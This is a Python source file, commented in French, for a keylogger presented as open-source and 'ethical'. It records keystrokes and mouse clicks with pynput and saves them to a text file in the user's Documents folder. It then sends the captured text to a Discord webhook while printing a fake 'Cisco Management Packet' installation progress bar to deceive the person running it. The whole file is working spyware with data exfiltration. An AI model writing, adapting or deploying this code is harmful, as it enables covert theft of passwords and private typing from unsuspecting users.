# Keylogger open source - s0d3ep
# GitHub: https://github.com/waaashed/keylogger-ethical

# Configuration
RECORD_DURATION = 10  # Temps en secondes
WEBHOOK_URL = "VOTRE API DISCORD WEBHOOK"  # Renseignez votre API

from flask import Flask, render_template_string
import os
import platform
from pynput import keyboard, mouse
import time
import threading
import requests
import webbrowser

app = Flask(__name__)

# Obtient le chemin absolu du répertoire "Documents" en fonction de la plateforme
if platform.system() == 'Windows':
    documents_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Documents')
else:  # Linux
    documents_path = os.path.join(os.path.expanduser('~'), 'Documents')

# Chemin du fichier dans le répertoire "Documents"
file_path = os.path.join(documents_path, "keylogger.txt")

# Assurez-vous que le répertoire existe, s'il n'existe pas encore
if not os.path.exists(documents_path):
    os.makedirs(documents_path)

# Durée d'enregistrement en secondes
record_duration = RECORD_DURATION

# Temps de début d'enregistrement
start_time = time.time()

# Liste pour stocker les frappes
key_presses = []

# Initialisation d'une variable pour stocker les clics de souris
mouse_clicks = 0

# URL du webhook Discord
webhook_url = WEBHOOK_URL

# Modèle HTML avec le CSS intégré
template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Keylogger Report</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body {
            background-color: #000000;
            color: #00ff00;
            font-family: "Courier New", monospace;
            margin: 20px;
        }
        a {
            color: lime;
            text-decoration: none;
        }
        h1 {
            color: lime;
            font-size: 36px;
            font-weight: bold;
            text-align: center;
        }
        pre, code {
            color: lime;
            font-family: "Courier New", monospace;
            font-size: 14px;
            background-color: #000000;
            padding: 10px;
            white-space: pre-wrap;
            overflow-x: auto;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
        }
        p {
            color: #00ff00;
            font-size: 16px;
            line-height: 1.5;
            text-align: center;
            margin-top: 20px;
        }
        img {
            max-width: 100%;
            height: auto;
            margin-top: 20px;
            margin-bottom: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
            display: block; /* Pour centrer le GIF */
            margin-left: auto;
            margin-right: auto;
        }
        .container {
            background-color: #000000;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Keylogger Report</h1>
        <pre>{{ key_presses }}</pre>
        <p>{{ user_profile }}, n'oublie pas que la curiosité n'est pas toujours bien vue...<br></p>
        <img src="https://media.tenor.com/yOwKX_hMp6cAAAAd/hackerman-rami-malek.gif" alt="GIF de Hackerman">
    </div>
</body>
</html>
"""

# Fonction appelée lorsqu'une touche ou un clic de souris est pressé
def on_press(key):
    global mouse_clicks  # Mot-clé global pour accéder à la variable déclarée en dehors de la fonction
    # Exclut les événements des touches "backspace", "espace", "enter" etc ...
    if key in [keyboard.Key.backspace,
               keyboard.Key.space,
               keyboard.Key.enter,
               keyboard.Key.caps_lock,
               keyboard.Key.shift,
               keyboard.Key.shift_r,
               keyboard.Key.alt,
               keyboard.Key.alt_l,
               keyboard.Key.ctrl,
               keyboard.Key.tab,
               keyboard.Key.ctrl_r,
               keyboard.Key.ctrl_l,
               keyboard.Key.alt_gr]:

        # Ajoute un espace dans la liste pour rendre plus lisible
        if key == keyboard.Key.space:
            key_presses.append(" ")
        return
    try:
        # Ajoute la touche à la liste
        key_presses.append(key.char)
    except AttributeError:
        # Si la touche n'est pas un caractère, ajoute la représentation de la touche
        key_presses.append(str(key))

# Fonction appelée lorsqu'un clic de souris est effectué
def on_click(x, y, button, pressed):
    global mouse_clicks
    if button == mouse.Button.left and pressed:
        # Ajoute un espace à chaque clic gauche pour éviter que les textes se suivent en cas de changement de page
        key_presses.append(" ")
        mouse_clicks += 1

# Fonction pour lancer le serveur web
def start_web_server():
    os.chdir(documents_path)

    # Utilisez l'application Flask pour obtenir le contexte d'application
    with app.app_context():
        # Rend le modèle à l'intérieur du contexte de l'application Flask
        rendered_html = render_template_string(template, key_presses="".join(key_presses), user_profile=user_profile)

        # Sauvegarde le HTML dans un fichier
        with open("keylogger_report.html", "w", encoding="utf-8") as html_file:
            html_file.write(rendered_html)

        # Ouvre le fichier HTML dans le navigateur après la création
        webbrowser.open('file://' + os.path.abspath("keylogger_report.html"))

        # Envoi des données au webhook Discord
        payload = {
            "content": "".join(key_presses),
            "username": "Keylogger Bot"
        }
        requests.post(webhook_url, json=payload)

if __name__ == '__main__':
    print("Téléchargement de Cisco Management Packet en cours, veuillez ne pas quitter...\n")

    # Démarre l'écoute des touches
    with keyboard.Listener(on_press=on_press) as key_listener:
        # Démarre l'écoute des clics de souris
        with mouse.Listener(on_click=on_click) as mouse_listener:
            # Enregistre pendant la durée spécifiée
            while time.time() - start_time < record_duration:
                # Ajoutez ici votre propre logique si nécessaire

                # Barre de progression
                remaining_time = max(0, record_duration - (time.time() - start_time))
                progress = int((1 - remaining_time / record_duration) * 50)
                print(f"\rProgression : [{'#' * progress}{'.' * (50 - progress)}] {int(remaining_time)}s restantes", end='', flush=True)
                time.sleep(1)  # Mettez à jour la barre toutes les secondes
            print("\n")
            print("\nFin de l'installation.")

    # Arrête l'écoute des touches et des clics de souris
    key_listener.stop()
    mouse_listener.stop()

    # Utilise os.path.basename() pour extraire le nom du répertoire utilisateur
    user_profile = os.path.basename(os.path.expanduser('~'))
    message = f""
    key_presses.append(message)

    # Enregistre les frappes dans le fichier texte
    with open(file_path, "w") as file:
        file.write("".join(key_presses))

    # Crée un thread pour le serveur web
    web_server_thread = threading.Thread(target=start_web_server)
    web_server_thread.start()
